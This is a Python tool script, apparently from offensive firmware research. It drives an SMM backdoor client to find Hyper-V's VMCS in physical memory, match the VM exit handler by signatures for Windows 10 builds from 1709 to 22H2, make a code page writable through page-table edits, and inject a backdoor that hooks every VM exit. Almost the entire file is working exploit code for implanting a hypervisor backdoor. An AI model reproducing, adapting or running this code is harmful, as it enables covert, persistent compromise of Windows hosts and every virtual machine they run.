#!/usr/bin/env python

import sys, os, time, platform, ctypes
from struct import pack, unpack
from optparse import OptionParser, make_option

import smm_backdoor as bd

# how many seconds to wait for VM exit occur
VM_EXIT_WAIT = 3

# max memory address of HOST_CR3
HV_MAX_CR3 = 0x200000000

# max number of VMCS bytes to scan for HOST_CR3 and HOST_RIP
HV_MAX_VMCS = 0x100

# Hyper-V image section alignment
HV_IMAGE_ALIGN = 0x200000

# Hyper-V image max size
HV_MAX_IMAGE_SIZE = 0x2000000

# Present flag of PML4, PDPTE, PDE and PTE
PT_PRESENT = 0x01

# RW flag of PDPTE, PDE and PTE
PT_RW = 0x02

# Page Size flag of PDPTE and PDE
PT_PS = 0x80

pfn_to_page = lambda val: ((val >> bd.PAGE_SHIFT) & 0xffffffffff) << bd.PAGE_SHIFT

# get MPL4 address from CR3 register value
PML4_address = lambda val: val & 0xfffffffffffff000

# get address translation indexes from virtual address
PML4_index = lambda addr: (addr >> 39) & 0x1ff
PDPT_index = lambda addr: (addr >> 30) & 0x1ff
PDE_index  = lambda addr: (addr >> 21) & 0x1ff
PTE_index  = lambda addr: (addr >> 12) & 0x1ff

# Hyper-V backdoor body file path
BACKDOOR_PATH = 'hyper_v_backdoor.bin'

# ofsset of the backdoor code from the beginning of HvlpLowMemoryStub()
BACKDOOR_OFFSET = 0x400

# size of HVBD_DATA structure, see HyperV.c
HVBD_DATA_SIZE = 0x4b0

# VmExitHandler and Version field offsets of HVBD_DATA structure
HVBD_HANDLER = 4 * 8
HVBD_VERSION = 5 * 8

m_verbose = False

# VMCS memory scan options
mem_scan_step = 0x001000000
mem_scan_from = 0x100000000
mem_scan_to   = 0x200000000

'''

VM exit handler signature for Windows 10 1709:

    .text:FFFFF80000265125      mov     [rsp+arg_20], rcx
    .text:FFFFF8000026512A      xor     ecx, ecx
    .text:FFFFF8000026512C      mov     [rsp+arg_28], rcx
    .text:FFFFF80000265131      mov     rcx, [rsp+arg_18]
    .text:FFFFF80000265136      mov     [rcx], rax
    .text:FFFFF80000265139      mov     [rcx+8], rcx
    
    ...

    .text:FFFFF8000026516D      mov     [rcx+78h], r15
    .text:FFFFF80000265171      mov     rax, [rsp+arg_20]
    .text:FFFFF80000265176      mov     [rcx+8], rax
    .text:FFFFF8000026517A      lea     rax, [rcx+100h]

    ...

    .text:FFFFF800002651A6      mov     rdx, [rsp+arg_28]
    .text:FFFFF800002651AB      call    sub_FFFFF80000219B00

'''
HV_SIG_1709 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x11, 0x48), (0x12, 0x89), (0x13, 0x01),
                 (0x14, 0x48), (0x15, 0x89), (0x16, 0x49), (0x17, 0x08),
                 (0x48, 0x4c), (0x49, 0x89), (0x4a, 0x79), (0x4b, 0x78),
                 (0x86, 0xe8) ], 0x86, 16299 ]

'''

Match hvix64.sys VM exit handler signature for Windows 10 1803:

    .text:FFFFF8000027A150      mov     [rsp+arg_20], rcx
    .text:FFFFF8000027A155      xor     ecx, ecx
    .text:FFFFF8000027A157      mov     [rsp+arg_28], rcx
    .text:FFFFF8000027A15C      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000027A161      mov     [rcx], rax
    .text:FFFFF8000027A164      mov     [rcx+8], rcx
    
    ...

    .text:FFFFF8000027A198      mov     [rcx+78h], r15
    .text:FFFFF8000027A19C      mov     rax, [rsp+arg_20]
    .text:FFFFF8000027A1A1      mov     [rcx+8], rax
    .text:FFFFF8000027A1A5      lea     rax, [rcx+100h]

    ...

    .text:FFFFF8000027A222      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000027A227      call    sub_FFFFF80000219C10

'''
HV_SIG_1803 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x11, 0x48), (0x12, 0x89), (0x13, 0x01),
                 (0x14, 0x48), (0x15, 0x89), (0x16, 0x49), (0x17, 0x08),
                 (0x48, 0x4c), (0x49, 0x89), (0x4a, 0x79), (0x4b, 0x78),
                 (0xd7, 0xe8) ], 0xd7, 17134 ]

'''

VM exit handler signature for Windows 10 1809:

    .text:FFFFF8000028B414      mov     [rsp+arg_20], rcx
    .text:FFFFF8000028B419      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000028B41E      mov     rcx, [rcx]
    .text:FFFFF8000028B421      mov     [rcx], rax
    .text:FFFFF8000028B424      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000028B454      mov     [rcx+78h], r15
    .text:FFFFF8000028B458      mov     rax, [rsp+arg_20]
    .text:FFFFF8000028B45D      mov     [rcx+8], rax
    .text:FFFFF8000028B461      lea     rax, [rcx+70h]

    ...

    .text:FFFFF8000028B52D      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000028B532      call    sub_FFFFF800002174F0

'''
HV_SIG_1809 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0x11e, 0xe8) ], 0x11e, 17763 ]

'''

VM exit handler signature for Windows 10 1903 and 1909:

    .text:FFFFF8000026C39F      mov     [rsp+arg_20], rcx
    .text:FFFFF8000026C3A4      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000026C3A9      mov     rcx, [rcx]
    .text:FFFFF8000026C3AC      mov     [rcx], rax
    .text:FFFFF8000026C3AF      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000026C3DF      mov     [rcx+78h], r15
    .text:FFFFF8000026C3E3      mov     rax, [rsp+arg_20]
    .text:FFFFF8000026C3E8      mov     [rcx+8], rax
    .text:FFFFF8000026C3EC      lea     rax, [rcx+70h]

    ...

    .text:FFFFF8000026C4B2      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000026C4B7      call    sub_FFFFF80000229F40

'''
HV_SIG_1903 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0x118, 0xe8) ], 0x118, 18362 ]

'''

Match hvix64.sys VM exit handler signature for Windows 10 2004 and 20H2:

    .text:FFFFF80000232372      mov     [rsp+arg_20], rcx
    .text:FFFFF80000232377      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023237C      mov     rcx, [rcx]
    .text:FFFFF8000023237F      mov     [rcx], rax
    .text:FFFFF80000232382      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF800002323B2      mov     [rcx+78h], r15
    .text:FFFFF800002323B6      mov     rax, [rsp+arg_20]
    .text:FFFFF800002323BB      mov     [rcx+8], rax
    .text:FFFFF800002323BF      lea     rax, [rcx+70h]
    
    ...

    .text:FFFFF80000232436      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023243B      mov     rdx, [rsp+arg_28]
    .text:FFFFF80000232440      call    sub_FFFFF8000020E010

'''
HV_SIG_2004 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0xce, 0xe8) ], 0xce, 19041 ]
'''

Match hvix64.sys VM exit handler signature for Windows 10 22H2:

    .text:FFFFF8000023E313      mov     [rsp+arg_20], rcx
    .text:FFFFF8000023E318      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023E31D      mov     rcx, [rcx]
    .text:FFFFF8000023E320      mov     [rcx], rax
    .text:FFFFF8000023E323      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000023E353      mov     [rcx+78h], r15
    .text:FFFFF8000023E357      mov     rax, [rsp+arg_20]
    .text:FFFFF8000023E35C      mov     [rcx+8], rax
    .text:FFFFF8000023E360      lea     rax, [rcx+70h]
    
    ...

    .text:FFFFF8000023E3D5      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023E3DA      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000023E3DF      call    sub_FFFFF800002118D0

'''
HV_SIG_22H2 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0xcc, 0xe8) ], 0xcc, 19045 ]

# all of the signatures for known versions of Hyper-V
HV_SIG = [ HV_SIG_1709, HV_SIG_1803, HV_SIG_1809, HV_SIG_1903, HV_SIG_2004, HV_SIG_22H2 ]


def find_vmcs(addr = None):

    addr = mem_scan_from if addr is None else addr

    while addr < mem_scan_to:

        if m_verbose:

            print(' * 0x%.16x' % addr)

        # ask SMM backdoor to scan memory region for potential VMCS
        vmcs_addr = bd.find_vmcs(addr, mem_scan_step)

        if vmcs_addr is not None:                    

            # potential VMCS region was found
            return vmcs_addr

        else:

            # check the next region
            addr += mem_scan_step

    return None


def find_low_mem(cr3):

    for i in range(0, 0x10):

        addr_virt = bd.PAGE_SIZE * i
        addr_phys = bd.get_phys_addr(addr_virt, cr3 = cr3, eptp = None)

        # check for allocated and mapped low memory page
        if addr_virt == addr_phys:

            # check for the short jump instruction
            if bd.read_phys_mem_1(addr_phys) == 0xeb:

                return addr_virt
            
    return None


def find_vm_exit_call(code):

    # enumerate known signatures
    for sign, call_offset, version in HV_SIG:

        for i in range(0, len(code) - 0x200):

            matched = True

            for offset, value in sign:

                # match each byte of the signature
                if value != ord(code[i + offset]):

                    matched = False
                    break

            if matched:

                # return host OS version and call offset
                return version, i + call_offset                

    return None


def get_hv_info():

    vmcs_addr = 0

    #
    # Some instructions from Hyper-V VM exit handler entry 
    # to validate potential HOST_RIP value
    #
    sign = [ '\x48\x89\x51\x10',    # mov     [rcx+10h], rdx
             '\x48\x89\x59\x18',    # mov     [rcx+18h], rbx
             '\x48\x89\x69\x28',    # mov     [rcx+28h], rbp
             '\x48\x89\x71\x30',    # mov     [rcx+30h], rsi
             '\x48\x89\x79\x38' ]   # mov     [rcx+38h], rdi

    print('[+] Searching for VMCS structure in physical memory, this might take a while...\n')
    
    print(' Scan step: 0x%.16x' % mem_scan_step)
    print(' Scan from: 0x%.16x' % mem_scan_from)
    print('   Scan to: 0x%.16x\n' % mem_scan_to)

    while vmcs_addr < mem_scan_to:

        # scan physical memory for VMCS candidate
        vmcs_addr = find_vmcs(addr = vmcs_addr if vmcs_addr > 0 else None)

        if vmcs_addr is None:

            # nothing found
            return None

        ptr, host_cr3_list, host_rip_list = 0, [], []

        # read VMCS contents
        data = bd.read_phys_mem(vmcs_addr, HV_MAX_VMCS)

        while ptr < HV_MAX_VMCS:
            
            # get single VMCS field
            val, = unpack('Q', data[ptr : ptr + 8])

            if val != 0:

                if val > 0xfffff80000000000 and val < 0xffffffffff000000:

                    # possible HOST_RIP value
                    host_rip_list.append(val)

                elif val < HV_MAX_CR3 and val % bd.PAGE_SIZE == 0:

                    # possible HOST_CR3 value
                    host_cr3_list.append(val)

            ptr += 8

        for host_cr3 in host_cr3_list:

            for host_rip in host_rip_list:

                # try to get HOST_RIP physical address
                addr_phys = bd.get_phys_addr(host_rip, cr3 = host_cr3, eptp = None)

                if addr_phys is not None:

                    # read some code from the hypervisor entry
                    data = bd.read_phys_mem(bd.align_down(addr_phys, bd.PAGE_SIZE), bd.PAGE_SIZE)

                    # check for VM exit handler signature
                    if data.find(''.join(sign)) != -1:

                        return vmcs_addr, host_rip, host_cr3

        # VMCS is not valid, continue scan
        vmcs_addr += bd.PAGE_SIZE

    return None


def get_pte(cr3, addr):

    table_addr = lambda table, index: table + (index * 8)
    table_entry = lambda table, index: bd.read_phys_mem_8(table_addr(table, index))

    # read PML4 entry
    PML4_entry = table_entry(PML4_address(cr3), PML4_index(addr))

    # chek present bit
    assert PML4_entry & PT_PRESENT != 0

    PDPT_addr = pfn_to_page(PML4_entry)

    # read PDPT entry
    PDPT_entry = table_entry(PDPT_addr, PDPT_index(addr))    
    
    if PDPT_entry & PT_PS != 0:

        # return 1GB page information
        return PDPT_entry, table_addr(PDPT_addr, PDPT_index(addr))        

    # chek present bit
    assert PDPT_entry & PT_PRESENT != 0

    PD_addr = pfn_to_page(PDPT_entry)

    # read PD entry
    PD_entry = table_entry(PD_addr, PDE_index(addr))        
    
    if PD_entry & PT_PS != 0:

        # return 2MB page information
        return PD_entry, table_addr(PD_addr, PDE_index(addr))

    # check present bit
    assert PD_entry & PT_PRESENT != 0

    PT_addr = pfn_to_page(PD_entry)

    # read PT entry
    PT_entry = table_entry(PT_addr, PTE_index(addr))    

    # return 4KB page information
    return PT_entry, table_addr(PT_addr, PTE_index(addr))


def infect():

    jump_32_len = 5
    jump_64_len = 14

    # to calculate jump/call displacement
    jump_32_op = lambda src, dst: pack('i', dst - src - jump_32_len)

    # to generate 64-bit address jump
    jump_64 = lambda addr: '\xff\x25\x00\x00\x00\x00' + pack('Q', addr)

    # find HOST_RIP and HOST_CR3 fields of VMCS
    info = get_hv_info()
    if info is None:

        print('ERROR: Unable to find VMCS')
        return -1

    vmcs_addr, host_rip, host_cr3 = info

    print('[+] Hypervisor VMCS structure was found\n')

    print(' Physical address: 0x%.16x' % vmcs_addr)
    print('         HOST_CR3: 0x%.16x' % host_cr3)
    print('         HOST_RIP: 0x%.16x\n' % host_rip)    

    # find HvlpLowMemoryStub() page
    low_mem = find_low_mem(host_cr3)
    if low_mem is None:

        print('ERROR: Unable to find HvlpLowMemoryStub()')
        return -1

    print('[+] HvlpLowMemoryStub() is at 0x%.16x' % low_mem)

    # backdoor code location
    backdoor_addr = low_mem + BACKDOOR_OFFSET

    # HVBD_DATA structure location
    hvbd_addr = low_mem + bd.PAGE_SIZE - HVBD_DATA_SIZE    
    
    code_virt = bd.align_down(host_rip, bd.PAGE_SIZE)
    code_phys = bd.get_phys_addr(code_virt, cr3 = host_cr3, eptp = None)

    assert code_phys is not None

    # read HOST_RIP code page
    code = bd.read_phys_mem(code_phys, bd.PAGE_SIZE)

    # find VM exit handler call by signature
    info = find_vm_exit_call(code)
    if info is None:

        print('ERROR: Unable to match VM exit handler signature')
        return -1

    hv_version, offset = info

    # get address of VM exit handler call
    vm_call_virt = code_virt + offset
    vm_call_phys = bd.get_phys_addr(vm_call_virt, cr3 = host_cr3, eptp = None)
    
    assert vm_call_phys is not None    

    # get VM exit handler call displacement operand
    call_op, = unpack('i', bd.read_phys_mem(vm_call_phys + 1, 4))

    # get address of VM exit handler
    vm_exit_virt = vm_call_virt + call_op + jump_32_len
    vm_exit_phys = bd.get_phys_addr(vm_exit_virt, cr3 = host_cr3, eptp = None)

    assert vm_exit_phys is not None

    print('[+] Host operating system version is %d' % hv_version)    
    print('[+] VM exit handler is at 0x%.16x' % vm_exit_virt)
    print('[+] VM exit handler call is at 0x%.16x' % vm_call_virt)  

    # check if VM exit call operand was already patched
    if abs(call_op) < bd.PAGE_SIZE:

        print('Hyper-V backdoor is already installed')
        return 0      

    # get low memory stub page table entry
    pte_val, pte_addr = get_pte(host_cr3, low_mem)

    assert pte_val & PT_PRESENT != 0

    # make memory page writeable
    pte_val |= PT_RW    

    # update page table entry
    bd.write_phys_mem_8(pte_addr, pte_val)  

    # find padding to place 14 bytes jump
    jump_offset = code.find('\xcc' * jump_64_len)
    if jump_offset == -1:

        print('ERROR: Unable to find free space for 14 bytes jump')
        return -1

    jump_addr = bd.align_down(vm_call_virt, bd.PAGE_SIZE) + jump_offset

    print('[+] 14 bytes jump is at 0x%.16x' % jump_addr)

    assert os.path.isfile(BACKDOOR_PATH)

    with open(BACKDOOR_PATH, 'rb') as fd:        

        # read the backdoor code
        backdoor_body = fd.read()

    reg_push = [ '\x50',                            # push   rax
                 '\x0f\x20\xd8',                    # mov    rax, cr3
                 '\x0f\x22\xd8',                    # mov    cr3, rax
                 '\x51',                            # push   rcx
                 '\x52',                            # push   rdx
                 '\x53',                            # push   rbx
                 '\x56',                            # push   rsi
                 '\x57',                            # push   rdi
                 '\x55',                            # push   rbp
                 '\x41\x50',                        # push   r8
                 '\x41\x51',                        # push   r9
                 '\x41\x52',                        # push   r10
                 '\x41\x53',                        # push   r11
                 '\x41\x54',                        # push   r12
                 '\x41\x55',                        # push   r13
                 '\x41\x56',                        # push   r14
                 '\x41\x57',                        # push   r15
                 '\xe8\x00\x00\x00\x00',            # call   $+5
                 '\x5a',                            # pop    rdx
                 '\x48\x81\xe2\x00\xf0\xff\xff',    # and    rdx, 0xfffffffffffff000
                 '\x48\x83\xec\x28' ]               # sub    rsp, 0x28

    reg_pop  = [ '\x48\x83\xc4\x28',                # add    rsp, 0x28
                 '\x41\x5f',                        # pop    r15
                 '\x41\x5e',                        # pop    r14
                 '\x41\x5d',                        # pop    r13
                 '\x41\x5c',                        # pop    r12
                 '\x41\x5b',                        # pop    r11
                 '\x41\x5a',                        # pop    r10
                 '\x41\x59',                        # pop    r9
                 '\x41\x58',                        # pop    r8
                 '\x5d',                            # pop    rbp
                 '\x5f',                            # pop    rdi
                 '\x5e',                            # pop    rsi
                 '\x5b',                            # pop    rbx
                 '\x5a',                            # pop    rdx
                 '\x59',                            # pop    rcx
                 '\x58'  ]                          # pop    rax

    backdoor_code, backdoor_entry = '', 0
    
    # the backdoor body
    backdoor_code += backdoor_body

    # calculate entry address of the backdoor
    backdoor_entry = backdoor_addr + len(backdoor_code)

    print('[+] Backdoor entry is at 0x%.16x' % backdoor_entry)

    # registers save code
    backdoor_code += ''.join(reg_push)

    # backdoor body call
    backdoor_code += '\xe8' + jump_32_op(backdoor_addr + len(backdoor_code), backdoor_addr)

    # registers restore code
    backdoor_code += ''.join(reg_pop)

    # 14 bytes jump to VM exit handler
    backdoor_code += jump_64(vm_exit_virt)

    print('[+] Backdoor code size is %d bytes' % len(backdoor_code))

    # write complete backdoor code into the memory
    bd.write_phys_mem(backdoor_addr, backdoor_code)    

    assert hvbd_addr > backdoor_addr + len(backdoor_code)

    # write HVBD_DATA structure into the memory
    bd.write_phys_mem(hvbd_addr, '\0' * HVBD_DATA_SIZE)

    # write HVBD_DATA Version field
    bd.write_phys_mem_8(hvbd_addr + HVBD_VERSION, hv_version)

    # write HVBD_DATA VmExitHandler field
    bd.write_phys_mem_8(hvbd_addr + HVBD_HANDLER, vm_exit_virt)

    # write 14 bytes jump to the backdoor entry
    bd.write_phys_mem(code_phys + jump_offset, jump_64(backdoor_entry))

    print('[+] Patching VM exit handler call...')

    # patch VM exit handler call
    bd.write_phys_mem(vm_call_phys + 1, jump_32_op(vm_call_virt, jump_addr))

    #
    # Wait for the first VM exit with backdoor installed to flush TLB,
    # we need to do this because we changed memory protection of 
    # HvlpLowMemoryStub() from RX to RWX. After that we can patch 
    # backdoor entry to remove TLB flush instructions.
    #
    time.sleep(VM_EXIT_WAIT)

    # replace TLB flush instructions with NOPs
    bd.write_phys_mem(backdoor_entry + 1, '\x90' * 6)

    print('[+] Done, Hyper-V backdoor was successfully installed')

    return 0


def main():

    global m_verbose, mem_scan_step, mem_scan_from, mem_scan_to

    option_list = [    

        make_option('--scan-step', dest = 'scan_step', default = None,
            help = 'size of VMCS memory scan step'),    

        make_option('--scan-from', dest = 'scan_from', default = None,
            help = 'start address of VMCS memory scan'),

        make_option('--scan-to', dest = 'scan_to', default = None,
            help = 'end address of VMCS memory scan'),

        make_option('-v', '--verbose', dest = 'verbose', default = False, action = 'store_true',
            help = 'show progress during VMCS scan')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    # check OS
    assert platform.system() == 'Windows'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    m_verbose = options.verbose

    # set memory scan options
    mem_scan_step = mem_scan_step if options.scan_step is None else int(options.scan_step, 16)
    mem_scan_from = mem_scan_from if options.scan_from is None else int(options.scan_from, 16)
    mem_scan_to = mem_scan_to if options.scan_to is None else int(options.scan_to, 16)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    try:

        # inject Hyper-V backdoor
        return infect()    

    except KeyboardInterrupt:

        print('\nEXIT\n')

    return 0


if __name__ == '__main__':

    exit(main())

#
# EoF
#
